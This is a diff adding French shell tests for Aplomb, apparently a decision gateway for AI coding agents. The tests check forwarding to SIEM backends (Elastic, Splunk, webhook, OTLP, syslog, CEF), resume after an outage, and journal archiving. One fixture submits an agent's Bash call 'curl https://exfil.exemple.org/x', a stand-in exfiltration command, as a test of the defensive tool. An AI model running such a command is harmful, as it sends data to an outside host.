@@ -681,6 +681,118 @@ printf -- '- {nom: autre, motif: "X"}\n' >> "$B/filtres/contrats.yaml"
 verifier "filtre modifié après cosignature : serve refuse de démarrer" \
   '! "$APLOMB" serve --mandat mandats/modules.yaml --ecoute-decision 127.0.0.1:${P}52 --ecoute-admin 127.0.0.1:${P}53 --ecoute-passerelle 127.0.0.1:${P}54 --ecoute-llm 127.0.0.1:${P}55 --ecoute-mcp 127.0.0.1:${P}56 --ecoute-reporting 127.0.0.1:${P}57 --journal journal-modules2 --coffre coffre-modules2 > serve-modules2.log 2>&1 && grep -q "modifié depuis la cosignature" serve-modules2.log'
 verifier "journal des modules intact" '"$APLOMB" verify --journal journal-modules > /dev/null 2>&1'
+echo "--- Diffusion vers le SIEM (J9) : formats, fuseau, file persistante, reprise"
+# Ports ${Q}0x (Q=179). Le SIEM HTTP est d'abord coupé : la diffusion doit rattraper son retard à son
+# retour, sans perte ni doublon, y compris après un redémarrage d'Aplomb.
+Q=179
+mkdir -p "$B/siem"
+cat > "$B/siem/diffusion.yaml" <<EOF
+instance: banc-aplomb
+fuseau: Europe/Paris
+destinations:
+- {id: elastic, format: ecs, url: "http://127.0.0.1:${Q}08/_bulk", index: aplomb, jeton_env: APLOMB_BANC_ELASTIC}
+- {id: splunk, format: splunk-hec, url: "http://127.0.0.1:${Q}08/services/collector/event", jeton_env: APLOMB_BANC_HEC}
+- {id: alertes, format: webhook, url: "http://127.0.0.1:${Q}08/hook", jeton_env: APLOMB_BANC_WEBHOOK, types: [decision]}
+- {id: otel, format: otlp, url: "http://127.0.0.1:${Q}08/v1/logs"}
+- {id: syslog, format: syslog, adresse: "127.0.0.1:${Q}09", tls: false}
+- {id: arcsight, format: cef, fichier: $B/siem/aplomb.cef}
+EOF
+verifier "diffusion : jeton absent → serve refuse de démarrer et dit quoi faire" \
+  '! "$APLOMB" serve --mandat mandats/banc.yaml --diffusion siem/diffusion.yaml --ecoute-decision 127.0.0.1:${Q}00 --ecoute-admin 127.0.0.1:${Q}01 --ecoute-passerelle 127.0.0.1:${Q}02 --ecoute-llm 127.0.0.1:${Q}03 --ecoute-mcp 127.0.0.1:${Q}05 --ecoute-reporting 127.0.0.1:${Q}07 --journal journal-diff0 --coffre coffre-diff0 > serve-diff0.log 2>&1 && grep -q "APLOMB_BANC_ELASTIC absente" serve-diff0.log'
+export APLOMB_BANC_ELASTIC=faux-elastic APLOMB_BANC_HEC=faux-hec APLOMB_BANC_WEBHOOK=secret-du-banc
+verifier "aplomb diffusion verifier : destinations et fuseau" \
+  '"$APLOMB" diffusion verifier --config siem/diffusion.yaml > diff-verifier.log && grep -q "fuseau   : Europe/Paris" diff-verifier.log && grep -q "syslog : syslog vers tcp://" diff-verifier.log'
+verifier "aplomb diffusion exemple : modèle valide" '"$APLOMB" diffusion exemple > diff-exemple.yaml && grep -q "format: ecs" diff-exemple.yaml'
+verifier "aplomb modules : destinations SIEM à l'étape diffusion" \
+  '"$APLOMB" modules --mandat mandats/banc.yaml --diffusion siem/diffusion.yaml > modules-diff.log && grep -q "● siem:elastic" modules-diff.log && grep "siem:arcsight" modules-diff.log | grep -vq "hors de la machine"'
+verifier "aplomb modules sans diffusion.yaml : l'option est proposée" '"$APLOMB" modules --mandat mandats/banc.yaml > modules-sans.log && grep -q "○ siem" modules-sans.log'
+python3 "$RACINE/scripts/faux-siem.py" tcp "${Q}09" syslog.log & PIDS="$PIDS $!"
+servir_diff() {
+  "$APLOMB" serve --mandat mandats/banc.yaml --diffusion siem/diffusion.yaml --ecoute-decision "127.0.0.1:${Q}00" --ecoute-admin "127.0.0.1:${Q}01" \
+    --ecoute-passerelle "127.0.0.1:${Q}02" --ecoute-llm "127.0.0.1:${Q}03" --ecoute-mcp "127.0.0.1:${Q}05" --ecoute-reporting "127.0.0.1:${Q}07" \
+    --journal journal-diff --coffre coffre-diff >> serve-diff.log 2>&1 &
+  SERVE_DIFF=$!; PIDS="$PIDS $SERVE_DIFF"
+  for _ in $(seq 300); do curl -s -o /dev/null "http://127.0.0.1:${Q}01/" && break; sleep 0.1; done
+}
+servir_diff
+verifier "serve annonce la diffusion et le fuseau" 'grep -q "diffusion (SIEM)   : elastic (ecs), splunk (splunk-hec)" serve-diff.log && grep -q "fuseau Europe/Paris" serve-diff.log'
+decide_d() {  # session, outil, entrée JSON
+  curl -s -X POST "http://127.0.0.1:${Q}00/v1/decide" -H content-type:application/json \
+    -d "{\"session\":\"$1\",\"agent\":\"claude-code\",\"mode\":\"hook\",\"cwd\":\"$B/depot\",\"outil\":\"$2\",\"entree\":$3,\"phase\":\"avant\"}" > /dev/null
+}
+decide_d d1 Read "{\"file_path\":\"$B/depot/a.py\"}"
+decide_d d1 Bash '{"command":"curl https://exfil.exemple.org/x"}'
+decide_d d2 Bash '{"command":"python3 -m unittest"}'
+sleep 1
+verifier "SIEM coupé : rien de perdu, le retard est visible" \
+  '[ ! -s siem-http.log ] && [ "$(wc -l < syslog.log)" -ge 5 ] && [ "$(grep -c "^CEF:0" siem/aplomb.cef)" -ge 5 ]'
+python3 "$RACINE/scripts/faux-siem.py" http "${Q}08" siem-http.log & PIDS="$PIDS $!"
+compter_ecs() { python3 - "$1" <<'PYEOF'
+import json, sys
+ids = []
+for l in open("siem-http.log"):
+    r = json.loads(l)
+    if r["chemin"].endswith("_bulk"):
+        for ligne in r["corps"].splitlines():
+            d = json.loads(ligne)
+            if "create" in d:
+                ids.append(d["create"]["_id"])
+print(len(ids) if sys.argv[1] == "total" else len(set(ids)))
+PYEOF
+}
+attendre_ecs() { for _ in $(seq 400); do [ -s siem-http.log ] && [ "$(compter_ecs total)" -ge "$1" ] && break; sleep 0.1; done; }
+attendre_ecs 5
+verifier "SIEM rétabli : Elastic reçoit les 5 événements (session ×2, décision ×3)" '[ "$(compter_ecs total)" -eq 5 ] && [ "$(compter_ecs uniques)" -eq 5 ]'
+verifier "Elastic : ECS, jeton en en-tête ApiKey, horodatage UTC et fuseau" \
+  'grep "_bulk" siem-http.log | head -1 | grep -q "ApiKey faux-elastic" && grep -q "@timestamp.*Z" siem-http.log && grep -q "Europe/Paris" siem-http.log'
+verifier "Splunk HEC : sourcetype et jeton Splunk" 'grep "services/collector" siem-http.log | grep -q "Splunk faux-hec" && grep -q "aplomb:journal" siem-http.log'
+verifier "OTLP : logs OpenTelemetry" 'grep "/v1/logs" siem-http.log | grep -q "resourceLogs"'
+verifier "webhook : signature HMAC valide, décisions seulement" "python3 - <<'PYEOF'
+import hmac, hashlib, json
+ok = False
+for l in open('siem-http.log'):
+    r = json.loads(l)
+    if r['chemin'] != '/hook':
+        continue
+    e = r['entetes']
+    attendu = 'sha256=' + hmac.new(b'secret-du-banc', (e['x-aplomb-horodatage'] + '.' + r['corps']).encode(), hashlib.sha256).hexdigest()
+    assert hmac.compare_digest(attendu, e['x-aplomb-signature'])
+    assert all(x['type'] == 'decision' for x in json.loads(r['corps']))
+    ok = True
+assert ok
+PYEOF"
+verifier "syslog RFC 5424 : priorité, horodatage avec décalage, données structurées" \
+  'grep -Eq "^<1[0-9]{2}>1 20[0-9-]{8}T[0-9:.]{12}\+0[12]:00 banc-aplomb aplomb - decision \[aplomb@32473 " syslog.log'
+verifier "aucun contenu chiffré ni ressource ne sort (exfil.exemple.org, a.py)" \
+  '! grep -q "exfil.exemple\|a\.py\|\"chiffre\"" siem-http.log syslog.log siem/aplomb.cef'
+verifier "GET /admin/diffusion : réservé aux comptes connectés" '[ "$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:${Q}01/admin/diffusion")" = 401 ]'
+kill -INT "$SERVE_DIFF"; wait "$SERVE_DIFF" 2>/dev/null
+servir_diff
+decide_d d3 Read "{\"file_path\":\"$B/depot/b.py\"}"
+attendre_ecs 7
+sleep 1
+verifier "redémarrage : reprise au curseur, aucun doublon" '[ "$(compter_ecs total)" -eq 7 ] && [ "$(compter_ecs uniques)" -eq 7 ]'
+verifier "aplomb diffusion apercu : la dernière décision dans les 8 formats" \
+  '"$APLOMB" diffusion apercu --config siem/diffusion.yaml --journal journal-diff > diff-apercu.log && grep -q "\"leef\": \"LEEF:2.0|Aplomb" diff-apercu.log && grep -q "\"cef\": \"CEF:0|Aplomb" diff-apercu.log'
+verifier "aplomb diffusion tester : événement de test reçu" \
+  '"$APLOMB" diffusion tester --config siem/diffusion.yaml --destination splunk > /dev/null && grep -q "test-diffusion" siem-http.log'
+kill -INT "$SERVE_DIFF"; wait "$SERVE_DIFF" 2>/dev/null
+verifier "journal de la diffusion intact" '"$APLOMB" verify --journal journal-diff > /dev/null 2>&1'
+echo "--- Conservation du journal (EF-I5) : archivage puis purge"
+verifier "aplomb journal archiver --jours 0 refusé" '! "$APLOMB" journal archiver --journal journal-diff --jours 0 --vers archive-diff > /dev/null 2>&1'
+AVANT=$(python3 -c "import time; print(int(time.time()*1000) + 1000)")
+verifier "archivage des sessions scellées" \
+  '"$APLOMB" journal archiver --journal journal-diff --avant "$AVANT" --vers archive-diff > archiver.log && grep -q "session(s) archivée(s)" archiver.log && [ "$(ls archive-diff/*.jsonl | wc -l)" -ge 3 ] && ! ls journal-diff/d1-*.jsonl > /dev/null 2>&1'
+verifier "journal actif vérifiable après archivage (registre de rétention)" \
+  '"$APLOMB" verify --journal journal-diff > verify-archive.log 2>&1 && grep -q "archivées : " verify-archive.log'
+verifier "archive vérifiable à part" '"$APLOMB" verify --journal archive-diff > /dev/null 2>&1'
+rm -rf archive-diff
+verifier "purge de l'archive : le journal reste vérifiable" '"$APLOMB" verify --journal journal-diff > /dev/null 2>&1'
+REGISTRE="$(ls journal-diff/_retention-*.jsonl)"
+cp "$REGISTRE" retention.sauve
+sed -i.bak '$d' "$REGISTRE"
+verifier "registre de rétention tronqué : détecté" '! "$APLOMB" verify --journal journal-diff > /dev/null 2>&1'
+cp retention.sauve "$REGISTRE"
 echo "--- Déverrouillage"
 SOCKET="$HOME/.config/aplomb/agent.sock"
 "$APLOMB" deverrouiller --duree 2m > deverrouiller.log 2>&1
